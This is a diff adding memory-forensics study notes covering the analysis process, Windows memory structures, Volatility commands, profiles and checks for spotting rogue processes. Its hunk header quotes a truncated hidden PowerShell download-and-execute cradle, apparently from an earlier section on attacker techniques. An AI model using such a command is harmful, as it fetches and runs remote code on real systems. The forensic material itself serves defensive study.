@@ -1880,10 +1880,182 @@ powershell -w Hidden -nop -noni -exec bypass IEX (New-ObjectSystem.Net.WebClient
 
 <br>
 
+## Memory Forensic Process
+1. Collect Data for Analysis
+	- Capture Raw Memory
+	- Hibernation File
+2. Put the Collected Into Context
+	- Establish Context
+		- Understand the disk, partitions, file system format
+	- Find Key Memory Offsets
+3. Analyze Results to Understand Meaning and Identify Important Elemets
+	- Analyze Data for Significant Elements
+	- Recover Evidence
+
+<br>
+
 ## Memory Analysis
+1. Identify Context
+	- Find the Kernel Processor Control Region (KPCR), Kernel Debugger Data Block (KDGB), and/or Directory Table Base (DTB)
+2. Parse Memory Structures
+	- Executive Process (EPROCESS) blocks
+		- All running proccess
+	- Process Environment (PEB) blocks
+		- Full commandlines (including arguements)
+		- DLLs loaded
+	- Virtual Address Descriptors (VAD) Tree
+		- List of memory sections belonging to the process
+		- Identify everthing that belongs to the process
+		- (i.e. Dump entire powershell process to identify scripts)
+	- Kernel Modules/Drivers
+3. Scan for Outliers
+	- Unlinked processes, DLLs, sockets, and threads (run code)
+	- Unmapped memory pages with executive privilges
+	- Hook detection
+	- Known heuristics and signatures
+4. Analysis: Search for Anomalies
 
+<br>
 
+<img alt="Micosoft's Attack Lifecycle" src="https://raw.githubusercontent.com/w00d33/w00d33.github.io/main/_files/KDGB_flow.PNG" />
 
+<br>
+
+## Volatility
+- [Volatility](https://code.google.com/archive/p/volatility/)
+- [Command Wiki](https://code.google.com/archive/p/volatility/wikis/CommandReference23.wiki)
+
+<br>
+
+**Basic Command Structure**
+
+```vol.py -f [image] --profile=[profile] [plugin]```
+
+<br>
+
+**Using Volatility**
+
+```vol.py -f memory.img --profile=Win10x64_19041 pslist```
+
+- Set an environment variable to replace -f image
+	- ```export VOLATILITY_LOCATION=file://<file path>```  
+
+- Remove environment variables
+	- ```unset VOLATILITY_LOCATION```  
+
+- Volatility plug in location (SIFT)
+	- ```/usr/local/src/Volatility/volatility/plugins/```  
+
+- Get help (-h or --info)
+	- ```vol.py malfind -h```
+	- ```--info``` to see profiles and registered objects
+	- [Command Info](https://github.com/volatilityfoundation/volatility/wiki/Command-Reference) 
+
+<br>
+
+**Volatility Profiles**
+- Requires the system type for a memory image be specified using the --profile=[profile]
+- Set environment variable
+	- ```export VOLATILITY_PROFILE=Win10x64_16299```
+
+<br>
+
+**Image Identification**
+- Windows Specification Example
+	- Edition: Windows 10 Pro
+	- Version: 1709
+	- OS Build: 16299.371
+Document Version and Build During Collection
+- The ```kdbgscan``` plugin can identify the build string
+	- Provides Profile Suggestion, Build String, and KdCopyDataBlock
+- [Volatility Profiles](https://github.com/volatilityfoundation/volatility/wiki/2.6-Win-Profiles)
+- ```vol.py --info | grep Win10```
+- Provide the KdCopyDataBlock to speed up runtimes
+	- ```-g or --kdbg=```
+	- ```vol.py -g 0xf801252197a4 --profile=Win10x64_16299 -f memory.img pslist```
+
+<br>
+
+**Hibernation File Conversion**
+- ```imagecopy```
+- Covert crash dumps and hibernation files to raw memory
+- Output filename (-o)
+- Provide correct image OS via (--profile=)
+- Also works for VMware Snapshot and VirtualBox memory
+- ```vol.py -f /memory/hiberfil.sys imagecopy -O hiberfil.raw --profile=WinXPSP2x86```
+
+<br>
+
+## Steps to Finding Evil 
+1. Identify Rogue Processes
+2. Analyze process DLLs and handles
+3. Review network artifacts
+4. Look for evidence of code injection
+5. Check for signs of rootkit
+6. Dump suspicious processes and drivers
+
+<br>
+
+## Identify Rogue Processes
+- Processes have a forward link (flink) and a back link (blink)
+- EPROCESS block holds a majority of the metadata for a process
+	- Name of process executable (image name)
+	- Process Identifier (PID)
+	- Parent PID
+	- Location in memory (offset)
+	- Creation Time
+	- Termination (exit) time
+	- Threads assigned to the process
+	- Handles to other operating system artifacts
+	- Link to the Virtual Address Descriptor tree
+	- Link to the Process Environment Block
+
+<br>
+
+### Analysis Process
+- Image Name
+	- Legitamate Process?
+	- Spelled correctly?
+	- Matches system context?
+- Full Path
+	- Appropriate path for system executable?
+	- Running from a user or temp directory?
+- Parent Process
+	- Is the parent process what you would expect?
+- Command Line
+	- Executable matches image name?
+	- Do arguments make sense?
+- Start Time
+	- Was the process started at boot (with other system processes)?
+	- Process started near time of known attack
+- Security IDs
+	- Do the security identifiers make sense?
+	- Why would a system process use a user account SID?
+
+<br>
+
+**Volatility Plugins**
+- pslist - print all running processes within the EPROCESS doubly linked list
+- psscan - scan physical memory for eprocess pool allocations
+- pstree - print process list as a tree showing parent relationships (using EPROCESS linked list)
+- malprocfind - automatically idetify suspicious system processes
+- processbl - compare processes and loaded DLLs with a baseline image
+
+<br>
+
+**Pslist**
+- Print all running processes by following the EPROCESS linked list
+- Show information for specific PIDs (-p)
+- Provides the binary name (Name). parent process (PPID), and time started (Time)
+- Thread (Thds) and Handle (Hnds) counts can reviewed for anomalies
+- Rootkits can unlink malicous processes from the linked list, rendering them invisible to this tool
+- Suspicious process (single or two lettered .exe's, mispelled system processes, system processes with incorrect PPID or didn't start at boot time)
+- [Hunt Evil Poster](https://github.com/w00d33/w00d33.github.io/blob/main/_files/SANS_Hunt_Evil_Poster.pdf) 
+- [EchoTrail](https://www.echotrail.io/)
+
+<br>
+
+**Psscan**
 
 
 
